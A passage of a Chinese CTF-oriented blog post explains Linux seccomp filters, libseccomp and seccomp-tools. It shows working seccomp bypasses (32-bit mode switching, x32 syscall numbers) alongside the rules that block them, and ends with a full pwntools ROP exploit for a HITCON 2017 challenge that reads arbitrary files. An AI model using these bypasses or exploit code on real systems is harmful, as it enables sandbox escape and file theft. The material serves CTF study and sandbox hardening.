jf, k }#endif</code></pre><p>其中在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/bpf_common.h" target="_blank" rel="noopener">include/uapi/linux/bpf_common.h</a>（<code>/usr/include/linux/bpf_common.h</code>）对 code 进行了一系列的定义，包括一些数据操作指令、跳转指令、算术运算指令等等（Winesap 提到程序可以全部用 BPF 的算术运算单元来实现，运行的时间是算在内核里，据说居然可以在 OJ 里绕过时间限制）：</p><pre><code class="cpp">/* Instruction classes */#define BPF_CLASS(code) ((code) &amp; 0x07)#define        BPF_LD        0x00#define        BPF_LDX        0x01#define        BPF_ST        0x02#define        BPF_STX        0x03#define        BPF_ALU        0x04#define        BPF_JMP        0x05#define        BPF_RET        0x06#define        BPF_MISC        0x07/* ld/ldx fields */#define BPF_SIZE(code)  ((code) &amp; 0x18)#define        BPF_W        0x00#define        BPF_H        0x08#define        BPF_B        0x10#define BPF_MODE(code)  ((code) &amp; 0xe0)#define        BPF_IMM        0x00#define        BPF_ABS        0x20#define        BPF_IND        0x40#define        BPF_MEM        0x60#define        BPF_LEN        0x80#define        BPF_MSH        0xa0/* alu/jmp fields */#define BPF_OP(code)    ((code) &amp; 0xf0)#define        BPF_ADD        0x00#define        BPF_SUB        0x10#define        BPF_MUL        0x20#define        BPF_DIV        0x30#define        BPF_OR        0x40#define        BPF_AND        0x50#define        BPF_LSH        0x60#define        BPF_RSH        0x70#define        BPF_NEG        0x80#define        BPF_MOD        0x90#define        BPF_XOR        0xa0#define        BPF_JA        0x00#define        BPF_JEQ        0x10#define        BPF_JGT        0x20#define        BPF_JGE        0x30#define        BPF_JSET        0x40#define BPF_SRC(code)   ((code) &amp; 0x08)#define        BPF_K        0x00#define        BPF_X        0x08</code></pre><p>从某个地址加载数据（数据的大小：<code>BPF_W</code>、<code>BPF_H</code>、<code>BPF_B</code>，地址的类型：<code>BPF_ABS</code>、<code>BPF_IMM</code>）：</p><pre><code class="cpp">BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0)</code></pre><p>然后 Seccomp 的返回值在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/seccomp.h" target="_blank" rel="noopener">include/uapi/linux/seccomp.h</a>（<code>/usr/include/linux/seccomp.h</code>）中有定义，意思也是比较直观的：</p><pre><code class="cpp">/* * All BPF programs must return a 32-bit value. * The bottom 16-bits are for optional return data. * The upper 16-bits are ordered from least permissive values to most. * * The ordering ensures that a min_t() over composed return values always * selects the least permissive choice. */#define SECCOMP_RET_KILL    0x00000000U /* kill the task immediately */#define SECCOMP_RET_TRAP    0x00030000U /* disallow and force a SIGSYS */#define SECCOMP_RET_ERRNO    0x00050000U /* returns an errno */#define SECCOMP_RET_TRACE    0x7ff00000U /* pass to a tracer or disallow */#define SECCOMP_RET_ALLOW    0x7fff0000U /* allow */</code></pre><p>Seccomp 编写规则时会使用到一个 <code>seccomp_data</code> 结构体，定义在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/seccomp.h" target="_blank" rel="noopener">include/uapi/linux/seccomp.h</a>（<code>/usr/include/linux/seccomp.h</code>）中。各个成员如下：</p><ul><li><code>nr</code>：系统调用号；</li><li><code>arch</code>：定义在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/audit.h" target="_blank" rel="noopener">include/uapi/linux/audit.h</a>（<code>/usr/include/linux/audit.h</code>）中；<ul><li><code>i386</code>：0x40000003；</li><li><code>amd64</code>：0xc000003e。</li></ul></li><li><code>instruction_pointer</code>：系统调用号对应的 IP；</li><li><code>args</code>：系统调用号。<ul><li><code>i386</code>：ebx、ecx、edx、esi、edi；</li><li><code>amd64</code>：rdi、rsi、rdx、r10、r8、r9。</li></ul></li></ul><pre><code class="cpp">#define AUDIT_ARCH_I386        (EM_386|__AUDIT_ARCH_LE)#define AUDIT_ARCH_IA64        (EM_IA_64|__AUDIT_ARCH_64BIT|__AUDIT_ARCH_LE)/** * struct seccomp_data - the format the BPF program executes over. * @nr: the system call number * @arch: indicates system call convention as an AUDIT_ARCH_* value *        as defined in &lt;linux/audit.h&gt;. * @instruction_pointer: at the time of the system call. * @args: up to 6 system call arguments always stored as 64-bit values *        regardless of the architecture. */struct seccomp_data {    int nr;    __u32 arch;    __u64 instruction_pointer;    __u64 args[6];};</code></pre><p>下面给一个例子测试，<code>SECCOMP_RET_ALLOW</code> 表示允许所有调用；<code>SECCOMP_RET_KILL</code> 表示禁止所有调用：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;linux/filter.h&gt;int main() {    struct sock_filter filter[] = {//        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),    };    struct sock_fprog prog = {        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),        .filter = filter,    };    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);    printf(&quot;###\n&quot;);    system(&quot;ls&quot;);}</code></pre><p><code>SECCOMP_RET_ALLOW</code> 会正常执行，而 <code>SECCOMP_RET_KILL</code> 会报“invalid system call”：</p><pre><code class="bash">➜  seccomp ./sec[1]    3372 invalid system call  ./sec</code></pre><p>禁用 execve 系统调用的规则如下。首先取出 <code>seccomp_data</code> 中的 <code>nr</code>，然后和 59 比较。如果相等，则跳过一条规则，即被 kill；不相等的话，继续执行下一条规则，即 allow：</p><pre><code class="cpp">struct sock_filter filter[] = {    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr    BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // compare nr with 59 (SYS_execve = 59)    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),};</code></pre><p>Seccomp 的过滤规则可以通过 gdb 来 dump 出来，即第二次调用 prctl 时的第三个参数：</p><pre><code>(gdb) p/x $rdx$1 = 0x7fffffffe480(gdb) x/2gx 0x7fffffffe4800x7fffffffe480:    0x00007fffffff0004    0x00007fffffffe490(gdb) x/4gx 0x00007fffffffe4900x7fffffffe490:    0x0000000000000020    0x0000003b000100150x7fffffffe4a0:    0x7fff000000000006    0x0000000000000006(gdb) dump memory dd 0x00007fffffffe490 0x00007fffffffe490+4*8</code></pre><p>然后使用 libseccomp 中的 scmp_bpf_disasm 反编译获取大致的过滤规则，通常需要根据反编译出来的结果去查找对应函数的意义：</p><pre><code class="bash">➜  seccomp scmp_bpf_disasm &lt; dd line  OP   JT   JF   K================================= 0000: 0x20 0x00 0x00 0x00000004   ld  $data[4] 0001: 0x15 0x00 0x03 0xc000003e   jeq 3221225534 true:0002 false:0005 0002: 0x20 0x00 0x00 0x00000000   ld  $data[0] 0003: 0x15 0x01 0x00 0x0000003b   jeq 59   true:0005 false:0004 0004: 0x06 0x00 0x00 0x7fff0000   ret ALLOW 0005: 0x06 0x00 0x00 0x00000000   ret KILL</code></pre><p>使用 seccomp-tools 也可以进行解析。</p><h2 id="Seccomp-using-libseccomp"><a href="#Seccomp-using-libseccomp" class="headerlink" title="Seccomp using libseccomp"></a>Seccomp using libseccomp</h2><blockquote><p>根据 veritas501 的博客做的一些记录。</p></blockquote><p>这边需要先安装一些依赖才会有 <code>seccomp.h</code> 头文件：</p><pre><code class="bash">sudo apt-get install libseccomp-dev libseccomp2 seccomp</code></pre><p>具体在 <code>/usr/include/seccomp.h</code> 中，一些选项如下：</p><pre><code class="cpp">/* * seccomp actions *//** * Kill the process */#define SCMP_ACT_KILL           0x00000000U/** * Throw a SIGSYS signal */#define SCMP_ACT_TRAP           0x00030000U/** * Return the specified error code */#define SCMP_ACT_ERRNO(x)       (0x00050000U | ((x) &amp; 0x0000ffffU))/** * Notify a tracing process with the specified value */#define SCMP_ACT_TRACE(x)       (0x7ff00000U | ((x) &amp; 0x0000ffffU))/** * Allow the syscall to be executed */#define SCMP_ACT_ALLOW          0x7fff0000U</code></pre><p><code>seccomp_init()</code> 用于初始化过滤状态：</p><pre><code class="cpp">/** * Initialize the filter state * @param def_action the default filter action * * This function initializes the internal seccomp filter state and should * be called before any other functions in this library to ensure the filter * state is initialized.  Returns a filter context on success, NULL on failure. * */scmp_filter_ctx seccomp_init(uint32_t def_action);</code></pre><p><code>seccomp_rule_add()</code> 用于添加新的规则。其中如果 <code>arg_cnt</code> 不为 0，那么 <code>arg_cnt</code> 表示后面限制的参数的个数，故只有参数满足要求时才会拦截：</p><pre><code class="cpp">/** * Add a new rule to the filter * @param ctx the filter context * @param action the filter action * @param syscall the syscall number * @param arg_cnt the number of argument filters in the argument filter chain * @param ... scmp_arg_cmp structs (use of SCMP_ARG_CMP() recommended) * * This function adds a series of new argument/value checks to the seccomp * filter for the given syscall; multiple argument/value checks can be * specified and they will be chained together (AND&#39;d together) in the filter. * If the specified rule needs to be adjusted due to architecture specifics it * will be adjusted without notification.  Returns zero on success, negative * values on failure. * */int seccomp_rule_add(scmp_filter_ctx ctx,                     uint32_t action, int syscall, unsigned int arg_cnt, ...);** * Specify an argument comparison struct for use in declaring rules * @param arg the argument number, starting at 0 * @param op the comparison operator, e.g. SCMP_CMP_* * @param datum_a dependent on comparison * @param datum_b dependent on comparison, optional */#define SCMP_CMP(...)           ((struct scmp_arg_cmp){__VA_ARGS__})/** * Specify an argument comparison struct for argument 0 */#define SCMP_A0(...)            SCMP_CMP(0, __VA_ARGS__)/** * Specify an argument comparison struct for argument 1 */#define SCMP_A1(...)            SCMP_CMP(1, __VA_ARGS__)/** * Specify an argument comparison struct for argument 2 */#define SCMP_A2(...)            SCMP_CMP(2, __VA_ARGS__)/** * Specify an argument comparison struct for argument 3 */#define SCMP_A3(...)            SCMP_CMP(3, __VA_ARGS__)/** * Specify an argument comparison struct for argument 4 */#define SCMP_A4(...)            SCMP_CMP(4, __VA_ARGS__)/** * Specify an argument comparison struct for argument 5 */#define SCMP_A5(...)            SCMP_CMP(5, __VA_ARGS__)/** * Comparison operators */enum scmp_compare {        _SCMP_CMP_MIN = 0,        SCMP_CMP_NE = 1,                /**&lt; not equal */        SCMP_CMP_LT = 2,                /**&lt; less than */        SCMP_CMP_LE = 3,                /**&lt; less than or equal */        SCMP_CMP_EQ = 4,                /**&lt; equal */        SCMP_CMP_GE = 5,                /**&lt; greater than or equal */        SCMP_CMP_GT = 6,                /**&lt; greater than */        SCMP_CMP_MASKED_EQ = 7,         /**&lt; masked equality */        _SCMP_CMP_MAX,};/** * Argument datum */typedef uint64_t scmp_datum_t;/** * Argument / Value comparison definition */struct scmp_arg_cmp {        unsigned int arg;       /**&lt; argument number, starting at 0 */        enum scmp_compare op;   /**&lt; the comparison op, e.g. SCMP_CMP_* */        scmp_datum_t datum_a;        scmp_datum_t datum_b;};</code></pre><p><code>seccomp_load()</code> 用来应用规则：</p><pre><code class="cpp">/** * Loads the filter into the kernel * @param ctx the filter context * * This function loads the given seccomp filter context into the kernel.  If * the filter was loaded correctly, the kernel will be enforcing the filter * when this function returns.  Returns zero on success, negative values on * error. * */int seccomp_load(const scmp_filter_ctx ctx);</code></pre><p>同样用最简单的例子测试一下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;seccomp.h&gt;#include &lt;linux/seccomp.h&gt;char *args[] = {    &quot;/bin/ls&quot;,    0,};int main() {    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_ALLOW);    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);    seccomp_load(ctx);    printf(&quot;###\n&quot;);    system(&quot;ls&quot;);    execve(args[0], args, 0);    return 0;}</code></pre><p>测试发现这里对 system 没有提示，直接过滤了，对 execve 会提示“invalid system call”。不过具体的功能是一样的：</p><pre><code class="bash">➜  seccomp ./sec###[1]    5480 invalid system call  ./sec</code></pre><h1 id="Bypass-Seccomp"><a href="#Bypass-Seccomp" class="headerlink" title="Bypass Seccomp"></a>Bypass Seccomp</h1><p>一般来说 64 位下的 Seccomp 会和前面的一样直接禁掉某个调用号。这种情况有一些方法可以对其绕过。</p><h2 id="绕过没有检查架构（arch）"><a href="#绕过没有检查架构（arch）" class="headerlink" title="绕过没有检查架构（arch）"></a>绕过没有检查架构（arch）</h2><p>一般题目里至少有 <code>SYS_mmap</code> 或 <code>SYS_mprotect</code> 能用，所以通常有机会执行任意 shellcode。通过下面的函数可以在 x86 和 x86_64 之间切换。<code>retf</code> 相当于 <code>POP IP</code> 和 <code>POP CS</code> 两条指令，而 32 位下 CS 为 0x23；64 位下 CS 为 0x33：</p><pre><code class="nasm">to32:    mov DWORD [rsp + 4], 0x23    retfto64:    mov DWORD [esp + 4], 0x33    retf</code></pre><p>假如程序的过滤规则和上面的一样，我们编写一个 <code>my_execve</code> 来调用：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;linux/filter.h&gt;extern void my_execve(void *, void *, void *);char *args[] = {    &quot;/bin/ls&quot;,    0,};int main() {    struct sock_filter filter[] = {        BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr        BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),    };    struct sock_fprog prog = {        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),        .filter = filter,    };    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);    my_execve(args[0], args, 0);}</code></pre><p><code>my_execve</code> 实现如下，因为 32 位下栈会少一半，所以为了防止程序 crash 需要搬一下栈：</p><pre><code class="nasm">section .textglobal my_execvemy_execve:    lea rsp, [stack]    call to32    mov eax, 11    mov ebx, edi    mov ecx, esi    int 0x80    retto32:    mov DWORD [rsp + 4], 0x23    retfsection .bss    resb 0x400stack:</code></pre><p>这样就可以成功执行 ls（如果开 sh 的话也没有办法执行命令的，因为 seccomp 的规则会在进程间继承）：</p><pre><code class="bash">➜  seccomp ./secMakefile  dd  sec  sec.asm  sec.c  sec.o</code></pre><p>限制办法就是添加对 arch 的检查：</p><pre><code class="cpp">struct sock_filter filter[] = {    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 4), // ld arch    BPF_JUMP(BPF_JMP + BPF_JEQ, 0xc000003e, 0, 3), // arch == x86_64    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr    BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),};</code></pre><h2 id="没有过滤-X32-SYSCALL-BIT"><a href="#没有过滤-X32-SYSCALL-BIT" class="headerlink" title="没有过滤 __X32_SYSCALL_BIT"></a>没有过滤 <code>__X32_SYSCALL_BIT</code></h2><ul><li>在 x86_64 下的一种特殊模式，使用 64 位寄存器和 32 位地址。</li><li>x32 中 <code>nr</code> 会加 <code>__X32_SYSCALL_BIT</code>（0x40000000），见 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/unistd.h" target="_blank" rel="noopener">include/uapi/asm/unistd.h</a>（<code>/usr/include/asm/unistd_x32.h</code>）</li><li>原本的系统调用号加上 0x40000000 是一样的效果</li></ul><p>把 my_execve 修改如下：</p><pre><code class="nasm">section .textglobal my_execvemy_execve:    mov rax, 59 + 0x40000000    syscall</code></pre><p>同样可以正常执行</p><pre><code class="bash">➜  seccomp ./secMakefile  dd  sec  sec.asm  sec.c  sec.o</code></pre><p>添加对系统调用号的检查来进行限制：</p><pre><code class="cpp">struct sock_filter filter[] = {    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 4), // ld arch    BPF_JUMP(BPF_JMP + BPF_JEQ, 0xc000003e, 0, 4), // arch == x86_64    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr    BPF_JUMP(BPF_JMP + BPF_JSET, 0x40000000, 2, 0), // nr &amp; 0x40000000    BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),};</code></pre><h2 id="没有道理的绕过方法"><a href="#没有道理的绕过方法" class="headerlink" title="没有道理的绕过方法"></a>没有道理的绕过方法</h2><ul><li>部分调用号是给 x32 用的，但在 x86_64 下一样能用</li><li>59、520、59+0x40000000、520+0x40000000 都是 execve</li><li>322、322+0x40000000、545、545+0x40000000（stub_execveat，和 execve 类似）也可以</li></ul><h1 id="Binary-Test"><a href="#Binary-Test" class="headerlink" title="Binary Test"></a>Binary Test</h1><p>使用 seccomp-tools 对一些题目进行测试。</p><h2 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw-orw"></a>pwnable.tw-orw</h2><p>这道题当时是只能用 read、open、write 三个调用来读 flag。这里用 seccomp-tools 来查看一下是怎么实现的限制：</p><pre><code class="bash">$ seccomp-tools dump ./orw line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code></pre><p>可以看到先是检查了 arch 必须是 32 位，然后系统调用只允许 rt_sigreturn、sigreturn、exit_group、exit、open、read、write。</p><h2 id="0CTF-2018-mathgame"><a href="#0CTF-2018-mathgame" class="headerlink" title="0CTF-2018-mathgame"></a>0CTF-2018-mathgame</h2><p>这道题也是限制了 arch 和一些调用：</p><pre><code class="bash">$ seccomp-tools dump ./mathgameStarting system, please wait...System started! line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x01 0x00 0x40000003  if (A == ARCH_I386) goto 0003 0002: 0x06 0x00 0x00 0x00000000  return KILL 0003: 0x20 0x00 0x00 0x00000000  A = sys_number 0004: 0x15 0x00 0x01 0x000000ad  if (A != rt_sigreturn) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0006: 0x15 0x00 0x01 0x00000077  if (A != sigreturn) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0008: 0x15 0x00 0x01 0x000000fc  if (A != exit_group) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x15 0x00 0x01 0x00000001  if (A != exit) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0012: 0x15 0x00 0x01 0x00000005  if (A != open) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0014: 0x15 0x00 0x01 0x00000003  if (A != read) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0016: 0x15 0x00 0x01 0x00000004  if (A != write) goto 0018 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0018: 0x15 0x00 0x01 0x000000c5  if (A != fstat64) goto 0020 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0020: 0x15 0x00 0x01 0x00000036  if (A != ioctl) goto 0022 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0022: 0x15 0x00 0x01 0x0000008c  if (A != _llseek) goto 0024 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0024: 0x15 0x00 0x01 0x000000c0  if (A != mmap2) goto 0026 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0026: 0x15 0x00 0x01 0x0000005b  if (A != munmap) goto 0028 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0028: 0x15 0x00 0x01 0x0000002d  if (A != brk) goto 0030 0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0030: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><h1 id="Related-CTF-Challs"><a href="#Related-CTF-Challs" class="headerlink" title="Related CTF Challs"></a>Related CTF Challs</h1><p>CTF 中涉及 Seccomp 的一些二进制题。记录一下用于在 IDA 中插入的 Seccomp 结构体：</p><pre><code class="cpp">struct sock_filter {    /* Filter block */    uint16_t    code;   /* Actual filter code */    uint8_t    jt;    /* Jump true */    uint8_t    jf;    /* Jump false */    uint32_t    k;      /* Generic multiuse field */};struct sock_fprog {    /* Required for SO_ATTACH_FILTER. */    unsigned short        len;    /* Number of filter blocks */    struct sock_filter *filter;};</code></pre><h2 id="HITCON-2017-seccomp"><a href="#HITCON-2017-seccomp" class="headerlink" title="HITCON-2017-seccomp"></a>HITCON-2017-seccomp</h2><p>先是一道逆向。程序不难，主要是逆 Seccomp 的部分来得出正确的 6 个参数。这里放一下<a href="https://blukat29.github.io/2017/11/hitcon-quals-2017-seccomp/" target="_blank" rel="noopener">其他大佬的 Writeup</a>：</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp){  signed int i; // [rsp+Ch] [rbp-54h]  struct sock_fprog prog; // [rsp+10h] [rbp-50h]  __int64 args[6]; // [rsp+20h] [rbp-40h]  unsigned __int64 v7; // [rsp+58h] [rbp-8h]  v7 = __readfsqword(0x28u);  prog.len = 4059;  prog.filter = (struct sock_filter *)&amp;s;  memset(args, 0, sizeof(args));  for ( i = 0; i &lt;= 4; ++i )    _isoc99_scanf(&quot;%llu&quot;, &amp;args[i]);  prctl(38, 1LL, 0LL, 0LL, 0LL);  if ( prctl(22, 2LL, &amp;prog) )  {    perror(&quot;prctl&quot;);    exit(1);  }  syscall(4919LL, args[0], args[1], args[2], args[3], args[4], args[5]);  printf(&quot;Excellent! flag: hitcon{%s}\n&quot;, args);  return 0;}</code></pre><h2 id="HITCON-2017-Impeccable-Artifact"><a href="#HITCON-2017-Impeccable-Artifact" class="headerlink" title="HITCON-2017-Impeccable_Artifact"></a>HITCON-2017-Impeccable_Artifact</h2><p>程序保护全开，且能对栈上的任意 8 个字节进行读写，同时没有对下标进行检查，所以能造成任意地址读写。然后一开始在 prepare 函数中对 syscall 进行了限制：</p><pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  int c; // [rsp+8h] [rbp-658h]  int idx; // [rsp+Ch] [rbp-654h]  __int64 arr[201]; // [rsp+10h] [rbp-650h]  unsigned __int64 v7; // [rsp+658h] [rbp-8h]  v7 = __readfsqword(0x28u);  prepare();  memset(arr, 0, 0x640uLL);  while ( 1 )  {    menu();    idx = 0;    _isoc99_scanf(&quot;%d&quot;, &amp;c);    if ( c != 1 &amp;&amp; c != 2 )      break;    puts(&quot;Idx?&quot;);    _isoc99_scanf(&quot;%d&quot;, &amp;idx);    if ( c == 1 )    {      printf(&quot;Here it is: %lld\n&quot;, arr[idx]);    }    else    {      puts(&quot;Give me your number:&quot;);      _isoc99_scanf(&quot;%lld&quot;, &amp;arr[idx]);    }  }  return 0LL;}</code></pre><p>用 seccomp-tools 中可以查看到程序判断了系统架构，然后将传入的第三个参数作为系统调用号（即 rdx 等于 rax），后面会判断 sys_number 和 rdx 是否相等，如果相等也能过 check，这个地方可以构造出一些本身被限制的函数。然后允许 read、write、fstat 等一些函数：</p><pre><code> line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x10 0xc000003e  if (A != ARCH_X86_64) goto 0018 0002: 0x20 0x00 0x00 0x00000020  A = args[2] 0003: 0x07 0x00 0x00 0x00000000  X = A 0004: 0x20 0x00 0x00 0x00000000  A = sys_number 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019 0006: 0x15 0x0c 0x00 0x00000001  if (A == write) goto 0019 0007: 0x15 0x0b 0x00 0x00000005  if (A == fstat) goto 0019 0008: 0x15 0x0a 0x00 0x00000008  if (A == lseek) goto 0019 0009: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0011 0010: 0x15 0x00 0x03 0x0000000a  if (A != mprotect) goto 0014 0011: 0x87 0x00 0x00 0x00000000  A = X 0012: 0x54 0x00 0x00 0x00000001  A &amp;= 0x1 0013: 0x15 0x04 0x05 0x00000001  if (A == 1) goto 0018 else goto 0019 0014: 0x1d 0x04 0x00 0x0000000b  if (A == X) goto 0019 0015: 0x15 0x03 0x00 0x0000000c  if (A == brk) goto 0019 0016: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0019 0017: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0019 0018: 0x06 0x00 0x00 0x00000000  return KILL 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code></pre><p>经过调试可以找到某些地址泄漏 Binary 和 libc，然后改 ret 处的代码构造 ROP 就能任意文件读取：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./artifact&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;Choice?\n&#39;)    p.sendline(str(c))def show(idx):    cmd(1)    p.recvuntil(&#39;Idx?\n&#39;)    p.sendline(str(idx))    p.recvuntil(&#39;Here it is:&#39;)    return int(p.recvuntil(&#39;\n&#39;, drop=True))def memo(idx, num):    cmd(2)    p.recvuntil(&#39;Idx?\n&#39;)    p.sendline(str(idx))    p.recvuntil(&#39;Give me your number:\n&#39;)    p.sendline(str(num))def leave():    cmd(3)binary_base = show(202) - 0xbb0bss_buf = binary_base + 0x202000info(&#39;binary_base = &#39; + hex(binary_base))offset = 0x00007ffff7a2d830 - 0x7ffff7a0d000libc_base = show(203) - offsetinfo(&#39;libc_base = &#39; + hex(libc_base))pop_rdi_ret = libc_base + next(libc.search(asm(&#39;pop rdi ; ret&#39;)))pop_rsi_ret = libc_base + next(libc.search(asm(&#39;pop rsi ; ret&#39;)))pop_rdx_ret = libc_base + next(libc.search(asm(&#39;pop rdx ; ret&#39;)))read_addr = libc_base + libc.symbols[&#39;read&#39;]write_addr = libc_base + libc.symbols[&#39;write&#39;]open_addr = libc_base + libc.symbols[&#39;open&#39;]def set_syscall(idx, syscall, rdi, rsi, rdx):    memo(idx, pop_rdi_ret)    memo(idx + 1, rdi)    memo(idx + 2, pop_rsi_ret)    memo(idx + 3, rsi)    memo(idx + 4, pop_rdx_ret)    memo(idx + 5, rdx)    memo(idx + 6, syscall)file_name_addr = bss_buf + 0x500buf_addr = bss_buf + 0x600set_syscall(203, read_addr, 0, file_name_addr, 0x20) # read file&#39;s nameset_syscall(210, open_addr, file_name_addr, 0, 2) # open&#39;s syscall number == 2set_syscall(217, read_addr, 3, buf_addr, 0x1000) # read file&#39;s contentset_syscall(224, write_addr, 1, buf_addr, 0x1000) # write to stdoutleave()p.sendline(&#39;exp.py\x00&#39;)p.interactive()</code></pre><h2 id="BSides-CTF-2015-Baby-Playpen-Fence"><a href="#BSides-CTF-2015-Baby-Playpen-Fence" class="headerlink" title="BSides-CTF-2015-Baby_Playpen_Fence"></a>BSides-CTF-2015-Baby_Playpen_Fence</h2><p>TODO</p><h2 id="BSides-CTF-2015-Big-Prison-Fence"><a href="#BSides-CTF-2015-Big-Prison-Fence" class="headerlink" title="BSides-CTF-2015-Big_Prison_Fence"></a>BSides-CTF-2015-Big_Prison_Fence</h2><p>TODO</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=gQXyZY7Ucjc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gQXyZY7Ucjc</a><br><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a><br><a href="https://www.linuxidc.com/Linux/2015-02/112913.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2015-02/112913.htm</a><br><a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Seccomp</a><br><a href="https://atum.li/2017/04/25/linuxsandbox/#seccomp" target="_blank" rel="noopener">https://atum.li/2017/04/25/linuxsandbox/#seccomp</a><br><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a><br><a href="https://github.com/briansp8210/CTF-writeup/tree/master/HITCON-2017-qual/Impeccable-Artifact" target="_blank" 